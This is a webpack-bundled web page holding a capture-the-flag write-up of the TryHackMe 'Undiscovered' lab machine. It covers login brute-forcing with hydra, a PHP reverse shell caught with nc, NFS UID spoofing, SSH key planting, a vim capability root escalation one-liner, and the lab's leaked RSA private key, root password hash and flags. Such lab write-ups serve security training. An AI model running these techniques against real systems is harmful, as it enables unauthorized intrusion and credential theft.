"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[1933],{3905:(e,n,t)=>{t.d(n,{Zo:()=>c,kt:()=>h});var i=t(67294);function r(e,n,t){return n in e?Object.defineProperty(e,n,{value:t,enumerable:!0,configurable:!0,writable:!0}):e[n]=t,e}function s(e,n){var t=Object.keys(e);if(Object.getOwnPropertySymbols){var i=Object.getOwnPropertySymbols(e);n&&(i=i.filter((function(n){return Object.getOwnPropertyDescriptor(e,n).enumerable}))),t.push.apply(t,i)}return t}function a(e){for(var n=1;n<arguments.length;n++){var t=null!=arguments[n]?arguments[n]:{};n%2?s(Object(t),!0).forEach((function(n){r(e,n,t[n])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(t)):s(Object(t)).forEach((function(n){Object.defineProperty(e,n,Object.getOwnPropertyDescriptor(t,n))}))}return e}function o(e,n){if(null==e)return{};var t,i,r=function(e,n){if(null==e)return{};var t,i,r={},s=Object.keys(e);for(i=0;i<s.length;i++)t=s[i],n.indexOf(t)>=0||(r[t]=e[t]);return r}(e,n);if(Object.getOwnPropertySymbols){var s=Object.getOwnPropertySymbols(e);for(i=0;i<s.length;i++)t=s[i],n.indexOf(t)>=0||Object.prototype.propertyIsEnumerable.call(e,t)&&(r[t]=e[t])}return r}var d=i.createContext({}),l=function(e){var n=i.useContext(d),t=n;return e&&(t="function"==typeof e?e(n):a(a({},n),e)),t},c=function(e){var n=l(e.components);return i.createElement(d.Provider,{value:n},e.children)},u="mdxType",p={inlineCode:"code",wrapper:function(e){var n=e.children;return i.createElement(i.Fragment,{},n)}},m=i.forwardRef((function(e,n){var t=e.components,r=e.mdxType,s=e.originalType,d=e.parentName,c=o(e,["components","mdxType","originalType","parentName"]),u=l(t),m=r,h=u["".concat(d,".").concat(m)]||u[m]||p[m]||s;return t?i.createElement(h,a(a({ref:n},c),{},{components:t})):i.createElement(h,a({ref:n},c))}));function h(e,n){var t=arguments,r=n&&n.mdxType;if("string"==typeof e||r){var s=t.length,a=new Array(s);a[0]=m;var o={};for(var d in n)hasOwnProperty.call(n,d)&&(o[d]=n[d]);o.originalType=e,o[u]="string"==typeof e?e:r,a[1]=o;for(var l=2;l<s;l++)a[l]=t[l];return i.createElement.apply(null,a)}return i.createElement.apply(null,t)}m.displayName="MDXCreateElement"},73673:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>d,contentTitle:()=>a,default:()=>p,frontMatter:()=>s,metadata:()=>o,toc:()=>l});var i=t(87462),r=(t(67294),t(3905));const s={},a="Undiscovered",o={unversionedId:"Tryhackme/Undiscovered/Undiscovered",id:"Tryhackme/Undiscovered/Undiscovered",title:"Undiscovered",description:"Discovery consists not in seeking new landscapes, but in having new eyes..",source:"@site/writeups/Tryhackme/Undiscovered/Undiscovered.md",sourceDirName:"Tryhackme/Undiscovered",slug:"/Tryhackme/Undiscovered/",permalink:"/writeups/Tryhackme/Undiscovered/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Tutorial",permalink:"/writeups/Tryhackme/Tutorial/"},next:{title:"Upload Vulnerabilities",permalink:"/writeups/Tryhackme/Upload Vulnerabilities/"}},d={},l=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Task 1 Capture The Flag",id:"task-1-capture-the-flag",level:2}],c={toc:l},u="wrapper";function p(e){let{components:n,...s}=e;return(0,r.kt)(u,(0,i.Z)({},c,s,{components:n,mdxType:"MDXLayout"}),(0,r.kt)("h1",{id:"undiscovered"},"Undiscovered"),(0,r.kt)("p",null,"Discovery consists not in seeking new landscapes, but in having new eyes.."),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/undiscoveredup"},"Undiscovered")),(0,r.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,r.kt)("ul",null,(0,r.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Web Enumeration"),(0,r.kt)("li",{parentName:"ul"},"Brute Forcing (http-post-form)"),(0,r.kt)("li",{parentName:"ul"},"Exploitation Upload"),(0,r.kt)("li",{parentName:"ul"},"Exploitation NFS"),(0,r.kt)("li",{parentName:"ul"},"Exploitation User ID"),(0,r.kt)("li",{parentName:"ul"},"Abusing SUID/GUID"),(0,r.kt)("li",{parentName:"ul"},"Capabilities")),(0,r.kt)("hr",null),(0,r.kt)("h2",{id:"task-1-capture-the-flag"},"Task 1 Capture The Flag"),(0,r.kt)("p",null,"Please allow 5 minutes for this instance to fully deploy before attacking. This vm was developed in collaboration with @H0j3n, thanks to him for the foothold and privilege escalation ideas."),(0,r.kt)("p",null,"Please consider adding undiscovered.thm in /etc/hosts"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo nmap -A -sS -sC -sV -O 10.10.59.152\n[sudo] password for kali:\nStarting Nmap 7.80 ( https://nmap.org ) at 2020-10-30 10:54 CET\nNmap scan report for 10.10.59.152\nHost is up (0.031s latency).\nNot shown: 996 closed ports\nPORT     STATE SERVICE VERSION\n22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   2048 c4:76:81:49:50:bb:6f:4f:06:15:cc:08:88:01:b8:f0 (RSA)\n|   256 2b:39:d9:d9:b9:72:27:a9:32:25:dd:de:e4:01:ed:8b (ECDSA)\n|_  256 2a:38:ce:ea:61:82:eb:de:c4:e0:2b:55:7f:cc:13:bc (ED25519)\n80/tcp   open  http    Apache httpd 2.4.18\n|_http-server-header: Apache/2.4.18 (Ubuntu)\n|_http-title: Did not follow redirect to http://undiscovered.thm\n111/tcp  open  rpcbind 2-4 (RPC #100000)\n| rpcinfo:\n|   program version    port/proto  service\n|   100000  2,3,4        111/tcp   rpcbind\n|   100000  2,3,4        111/udp   rpcbind\n|   100000  3,4          111/tcp6  rpcbind\n|   100000  3,4          111/udp6  rpcbind\n|   100003  2,3,4       2049/tcp   nfs\n|   100003  2,3,4       2049/tcp6  nfs\n|   100003  2,3,4       2049/udp   nfs\n|   100003  2,3,4       2049/udp6  nfs\n|   100021  1,3,4      35002/udp   nlockmgr\n|   100021  1,3,4      36838/tcp   nlockmgr\n|   100021  1,3,4      36993/tcp6  nlockmgr\n|   100021  1,3,4      51734/udp6  nlockmgr\n|   100227  2,3         2049/tcp   nfs_acl\n|   100227  2,3         2049/tcp6  nfs_acl\n|   100227  2,3         2049/udp   nfs_acl\n|_  100227  2,3         2049/udp6  nfs_acl\n2049/tcp open  nfs     2-4 (RPC #100003)\nNo exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).\nTCP/IP fingerprint:\nOS:SCAN(V=7.80%E=4%D=10/30%OT=22%CT=1%CU=44466%PV=Y%DS=2%DC=T%G=Y%TM=5F9BE2\nOS:D2%P=x86_64-pc-linux-gnu)SEQ(SP=102%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=8)OP\nOS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST\nOS:11NW7%O6=M508ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)EC\nOS:N(R=Y%DF=Y%T=40%W=6903%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=\nOS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(\nOS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%\nOS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N\nOS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C\nOS:D=S)\n\nNetwork Distance: 2 hops\nService Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nTRACEROUTE (using port 1723/tcp)\nHOP RTT      ADDRESS\n1   29.83 ms 10.8.0.1\n2   29.97 ms 10.10.59.152\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 24.71 seconds\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Undiscovered$ gobuster vhost -u http://undiscovered.thm/ -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt\n===============================================================\nGobuster v3.0.1\nby OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)\n===============================================================\n[+] Url:          http://undiscovered.thm/\n[+] Threads:      10\n[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt\n[+] User Agent:   gobuster/3.0.1\n[+] Timeout:      10s\n===============================================================\n2020/10/30 10:57:52 Starting gobuster\n===============================================================\nFound: manager.undiscovered.thm (Status: 200) [Size: 4584]\nFound: dashboard.undiscovered.thm (Status: 200) [Size: 4626]\nFound: deliver.undiscovered.thm (Status: 200) [Size: 4650]\nFound: newsite.undiscovered.thm (Status: 200) [Size: 4584]\nFound: develop.undiscovered.thm (Status: 200) [Size: 4584]\nFound: forms.undiscovered.thm (Status: 200) [Size: 4542]\nFound: maintenance.undiscovered.thm (Status: 200) [Size: 4668]\nFound: network.undiscovered.thm (Status: 200) [Size: 4584]\nFound: view.undiscovered.thm (Status: 200) [Size: 4521]\nFound: mailgate.undiscovered.thm (Status: 200) [Size: 4605]\nFound: play.undiscovered.thm (Status: 200) [Size: 4521]\nFound: start.undiscovered.thm (Status: 200) [Size: 4542]\nFound: booking.undiscovered.thm (Status: 200) [Size: 4599]\nFound: terminal.undiscovered.thm (Status: 200) [Size: 4605]\nFound: gold.undiscovered.thm (Status: 200) [Size: 4521]\nFound: internet.undiscovered.thm (Status: 200) [Size: 4605]\nFound: resources.undiscovered.thm (Status: 200) [Size: 4626]\n")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"manager.undiscovered.thm dashboard.undiscovered.thm deliver.undiscovered.thm newsite.undiscovered.thm develop.undiscovered.thm forms.undiscovered.thm maintenance.undiscovered.thm network.undiscovered.thm view.undiscovered.thm mailgate.undiscovered.thm play.undiscovered.thm start.undiscovered.thm booking.undiscovered.thm terminal.undiscovered.thm gold.undiscovered.thm internet.undiscovered.thm resources.undiscovered.thm")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://deliver.undiscovered.thm/"},"http://deliver.undiscovered.thm/")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"Powered by RiteCMS Version:2.2.1")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'kali@kali:~/CTFs/tryhackme/Undiscovered$ hydra -l admin -P /usr/share/wordlists/rockyou.txt deliver.undiscovered.thm http-post-form "/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong" -f\nHydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-10-30 11:13:22\n[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task\n[DATA] attacking http-post-form://deliver.undiscovered.thm:80/cms/index.php:username=^USER^&userpw=^PASS^:User unknown or password wrong\n[80][http-post-form] host: deliver.undiscovered.thm   login: admin   password: liverpool\n[STATUS] attack finished for deliver.undiscovered.thm (valid pair found)\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-10-30 11:13:29\n')),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"admin:liverpool")),(0,r.kt)("p",null,(0,r.kt)("img",{src:t(7301).Z,width:"1131",height:"253"})),(0,r.kt)("p",null,(0,r.kt)("img",{src:t(57507).Z,width:"535",height:"745"})),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://deliver.undiscovered.thm/cms/index.php?mode=filemanager&action=upload&directory=files"},"http://deliver.undiscovered.thm/cms/index.php?mode=filemanager&action=upload&directory=files")),(0,r.kt)("p",null,(0,r.kt)("a",{parentName:"p",href:"http://deliver.undiscovered.thm/files/php-reverse-shell.php"},"http://deliver.undiscovered.thm/files/php-reverse-shell.php")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Undiscovered$ nc -lvnp 9001\nListening on 0.0.0.0 9001\nConnection received on 10.10.141.31 60756\nLinux undiscovered 4.4.0-189-generic #219-Ubuntu SMP Tue Aug 11 12:26:50 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux\n 23:10:38 up 1 min,  0 users,  load average: 0.20, 0.15, 0.06\nUSER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n/bin/sh: 0: can't access tty; job control turned off\n$ python -c 'import pty; pty.spawn(\"/bin/bash\")'\nwww-data@undiscovered:/$ ^Z\n[1]+  Stopped                 nc -lvnp 9001\nkali@kali:~/CTFs/tryhackme/Undiscovered$ stty raw -echo\nkali@kali:~/CTFs/tryhackme/Undiscovered$ nc -lvnp 9001\n\nwww-data@undiscovered:/$ export TERM=xterm\nwww-data@undiscovered:/$\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"www-data@undiscovered:/$ cat /etc/exports\n# /etc/exports: the access control list for filesystems which may be exported\n#               to NFS clients.  See exports(5).\n#\n# Example for NFSv2 and NFSv3:\n# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)\n#\n# Example for NFSv4:\n# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)\n# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)\n#\n\n/home/william   *(rw,root_squash)\nwww-data@undiscovered:/$ cat /etc/passwd | grep william\nwilliam:x:3003:3003::/home/william:/bin/bash\nwww-data@undiscovered:/$\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"william:x:3003:3003::/home/william:/bin/bash\nleonard:x:1002:1002::/home/leonard:/bin/bash\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo useradd -u 3003 william\nkali@kali:~/CTFs/tryhackme/Undiscovered$ sudo useradd -u 1002 leonard\n\nkali@kali:~/CTFs/tryhackme/Undiscovered$ sudo passwd william\nNew password:\nRetype new password:\npasswd: password updated successfully\n\nkali@kali:~/CTFs/tryhackme/Undiscovered$ sudo passwd leonard\nNew password:\nRetype new password:\npasswd: password updated successfully\n\nkali@kali:~/CTFs/tryhackme/Undiscovered$ sudo mkdir -p /mnt/undiscoverd/william\nkali@kali:~/CTFs/tryhackme/Undiscovered$ sudo mkdir -p /mnt/undiscoverd/leonard\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo usermod -aG sudo leonard\nkali@kali:~/CTFs/tryhackme/Undiscovered$ sudo usermod -aG sudo william\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"sudo mount -t nfs 10.10.141.31:/home/william /mnt/undiscoverd/william\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo mount -t nfs 10.10.141.31:/home/william /mnt/undiscoverd/william\n[sudo] password for kali:\nkali@kali:~/CTFs/tryhackme/Undiscovered$ sudo su william\n$ 123\nsh: 1: 123: not found\n$ /bin/bash\nwilliam@kali:/home/kali/CTFs/tryhackme/Undiscovered$ cd /mnt/undiscoverd/william\nwilliam@kali:/mnt/undiscoverd/william$ ls\nadmin.sh  script  user.txt\nwilliam@kali:/mnt/undiscoverd/william$ cat user.txt\nTHM{8d7b7299cccd1796a61915901d0e091c}\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"kali@kali:~/CTFs/tryhackme/Undiscovered$ sudo su william\n$ 123\nsh: 1: 123: not found\n$ /bin/bash\nwilliam@kali:/home/kali/CTFs/tryhackme/Undiscovered$ cd /mnt/undiscoverd/william\nwilliam@kali:/mnt/undiscoverd/william$ ls\nadmin.sh  script  user.txt\nwilliam@kali:/mnt/undiscoverd/william$ cat user.txt\nTHM{8d7b7299cccd1796a61915901d0e091c}\nwilliam@kali:/mnt/undiscoverd/william$ mkdir .ssh\nwilliam@kali:/mnt/undiscoverd/william$ cd .ssh/\nwilliam@kali:/mnt/undiscoverd/william/.ssh$ ssh-keygen -f william\nGenerating public/private rsa key pair.\nEnter passphrase (empty for no passphrase):\nEnter same passphrase again:\nYour identification has been saved in william\nYour public key has been saved in william.pub\nThe key fingerprint is:\nSHA256:3kiWEQ/cM5Wy1fGlEPQ4G95msZ2pR7YX0P20ZMdfBJk william@kali\nThe key's randomart image is:\n+---[RSA 3072]----+\n|       .o. o=+o=o|\n|        .+= o+E=o|\n|        . .*+.++B|\n|         o.. =+=O|\n|        S   o =B+|\n|       + o   o+ o|\n|        o .  . o.|\n|              . .|\n|                 |\n+----[SHA256]-----+\nwilliam@kali:/mnt/undiscoverd/william/.ssh$ ls\nwilliam  william.pub\nwilliam@kali:/mnt/undiscoverd/william/.ssh$ chmod 600 william\nwilliam@kali:/mnt/undiscoverd/william/.ssh$ mkdir authorized_keys\nwilliam@kali:/mnt/undiscoverd/william/.ssh$ rm authorized_keys/\nrm: cannot remove 'authorized_keys/': Is a directory\nwilliam@kali:/mnt/undiscoverd/william/.ssh$ rm -rf authorized_keys/\nwilliam@kali:/mnt/undiscoverd/william/.ssh$ cat william.pub > .ssh/authorized_keys\nbash: .ssh/authorized_keys: No such file or directory\nwilliam@kali:/mnt/undiscoverd/william/.ssh$ cat william.pub > authorized_keys\nwilliam@kali:/mnt/undiscoverd/william/.ssh$ ssh -i william william@10.10.18.161\n^C\nwilliam@kali:/mnt/undiscoverd/william/.ssh$ ssh -i william william@10.10.141.31\nCould not create directory '/home/william/.ssh'.\nThe authenticity of host '10.10.141.31 (10.10.141.31)' can't be established.\nECDSA key fingerprint is SHA256:4FZwE+zBYXSpNWyxNclsv843P0McfDHD9nPMOH26bek.\nAre you sure you want to continue connecting (yes/no/[fingerprint])? yes\nFailed to add the host to the list of known hosts (/home/william/.ssh/known_hosts).\nWelcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n\n0 packages can be updated.\n0 updates are security updates.\n\n\nLast login: Thu Sep 10 00:35:09 2020 from 192.168.0.147\nwilliam@undiscovered:~$ cat admin.sh\n#!/bin/sh\n\n    echo \"[i] Start Admin Area!\"\n    echo \"[i] Make sure to keep this script safe from anyone else!\"\n\n    exit 0\nwilliam@undiscovered:~$ ./script\n[i] Start Admin Area!\n[i] Make sure to keep this script safe from anyone else!\nwilliam@undiscovered:~$ ./script test\n/bin/cat: /home/leonard/test: No such file or directory\nwilliam@undiscovered:~$ ./script .ssh/id_rsa\n-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAwErxDUHfYLbJ6rU+r4oXKdIYzPacNjjZlKwQqK1I4JE93rJQ\nHEhQlurt1Zd22HX2zBDqkKfvxSxLthhhArNLkm0k+VRdcdnXwCiQqUmAmzpse9df\nYU/UhUfTu399lM05s2jYD50A1IUelC1QhBOwnwhYQRvQpVmSxkXBOVwFLaC1AiMn\nSqoMTrpQPxXlv15Tl86oSu0qWtDqqxkTlQs+xbqzySe3y8yEjW6BWtR1QTH5s+ih\nhT70DzwhCSPXKJqtPbTNf/7opXtcMIu5o3JW8Zd/KGX/1Vyqt5ememrwvaOwaJrL\n+ijSn8sXG8ej8q5FidU2qzS3mqasEIpWTZPJ0QIDAQABAoIBAHqBRADGLqFW0lyN\nC1qaBxfFmbc6hVql7TgiRpqvivZGkbwGrbLW/0Cmes7QqA5PWOO5AzcVRlO/XJyt\n+1/VChhHIH8XmFCoECODtGWlRiGenu5mz4UXbrVahTG2jzL1bAU4ji2kQJskE88i\n72C1iphGoLMaHVq6Lh/S4L7COSpPVU5LnB7CJ56RmZMAKRORxuFw3W9B8SyV6UGg\nJb1l9ksAmGvdBJGzWgeFFj82iIKZkrx5Ml4ZDBaS39pQ1tWfx1wZYwWw4rXdq+xJ\nxnBOG2SKDDQYn6K6egW2+aNWDRGPq9P17vt4rqBn1ffCLtrIN47q3fM72H0CRUJI\nKtn7E2ECgYEA3fiVs9JEivsHmFdn7sO4eBHe86M7XTKgSmdLNBAaap03SKCdYXWD\nBUOyFFQnMhCe2BgmcQU0zXnpiMKZUxF+yuSnojIAODKop17oSCMFWGXHrVp+UObm\nL99h5SIB2+a8SX/5VIV2uJ0GQvquLpplSLd70eVBsM06bm1GXlS+oh8CgYEA3cWc\nTIJENYmyRqpz3N1dlu3tW6zAK7zFzhTzjHDnrrncIb/6atk0xkwMAE0vAWeZCKc2\nZlBjwSWjfY9Hv/FMdrR6m8kXHU0yvP+dJeaF8Fqg+IRx/F0DFN2AXdrKl+hWUtMJ\niTQx6sR7mspgGeHhYFpBkuSxkamACy9SzL6Sdg8CgYATprBKLTFYRIUVnZdb8gPg\nzWQ5mZfl1leOfrqPr2VHTwfX7DBCso6Y5rdbSV/29LW7V9f/ZYCZOFPOgbvlOMVK\n3RdiKp8OWp3Hw4U47bDJdKlK1ZodO3PhhRs7l9kmSLUepK/EJdSu32fwghTtl0mk\nOGpD2NIJ/wFPSWlTbJk77QKBgEVQFNiowi7FeY2yioHWQgEBHfVQGcPRvTT6wV/8\njbzDZDS8LsUkW+U6MWoKtY1H1sGomU0DBRqB7AY7ON6ZyR80qzlzcSD8VsZRUcld\nsjD78mGZ65JHc8YasJsk3br6p7g9MzbJtGw+uq8XX0/XlDwsGWCSz5jKFDXqtYM+\ncMIrAoGARZ6px+cZbZR8EA21dhdn9jwds5YqWIyri29wQLWnKumLuoV7HfRYPxIa\nbFHPJS+V3mwL8VT0yI+XWXyFHhkyhYifT7ZOMb36Zht8yLco9Af/xWnlZSKeJ5Rs\nLsoGYJon+AJcw9rQaivUe+1DhaMytKnWEv/rkLWRIaiS+c9R538=\n-----END RSA PRIVATE KEY-----\nwilliam@undiscovered:~$ ./script .ssh/id_rsa > leonard\nwilliam@undiscovered:~$ chmod 600 leonard\nwilliam@undiscovered:~$ ssh -i leonard leonard@undiscovered\nThe authenticity of host 'undiscovered (127.0.1.1)' can't be established.\nECDSA key fingerprint is SHA256:4FZwE+zBYXSpNWyxNclsv843P0McfDHD9nPMOH26bek.\nAre you sure you want to continue connecting (yes/no)? yes\nWarning: Permanently added 'undiscovered' (ECDSA) to the list of known hosts.\nWelcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-189-generic x86_64)\n\n * Documentation:  https://help.ubuntu.com\n * Management:     https://landscape.canonical.com\n * Support:        https://ubuntu.com/advantage\n\n\n0 packages can be updated.\n0 updates are security updates.\n\n\nLast login: Fri Sep  4 22:57:43 2020 from 192.168.68.129\nleonard@undiscovered:~$ find / -type f -name \"*vi*\" -perm -4000 -ls 2>/dev/null\n   390706     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device\nleonard@undiscovered:~$\n")),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},'leonard@undiscovered:~$ find / -type f -name "*vi*" -perm -4000 -ls 2>/dev/null\n   390706     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device\nleonard@undiscovered:~$ getcap -r / 2>/dev/null\n/usr/bin/mtr = cap_net_raw+ep\n/usr/bin/systemd-detect-virt = cap_dac_override,cap_sys_ptrace+ep\n/usr/bin/traceroute6.iputils = cap_net_raw+ep\n/usr/bin/vim.basic = cap_setuid+ep\nleonard@undiscovered:~$ /usr/bin/vim.basic -c \':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")\'\n')),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"# id\nsh: 1: ot found\nsh: 1: 2Rid: not found\n# cat /etc/shadow | grep -i root\nroot:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::\n#\n")),(0,r.kt)("ol",null,(0,r.kt)("li",{parentName:"ol"},"user.txt")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"THM{8d7b7299cccd1796a61915901d0e091c}")),(0,r.kt)("ol",{start:2},(0,r.kt)("li",{parentName:"ol"},"Whats the root user's password hash?")),(0,r.kt)("p",null,(0,r.kt)("inlineCode",{parentName:"p"},"root:$6$1VMGCoHv$L3nX729XRbQB7u3rndC.8wljXP4eVYM/SbdOzT1IET54w2QVsVxHSH.ghRVRxz5Na5UyjhCfY6iv/koGQQPUB0:18508:0:99999:7:::")))}p.isMDXComponent=!0},7301:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/2020-10-30_11-14-acae22898bc4c846e15b481053317a5e.png"},57507:(e,n,t)=>{t.d(n,{Z:()=>i});const i=t.p+"assets/images/2020-10-30_11-24-030c5295f0e5671cbb797b66d6a15512.png"}}]);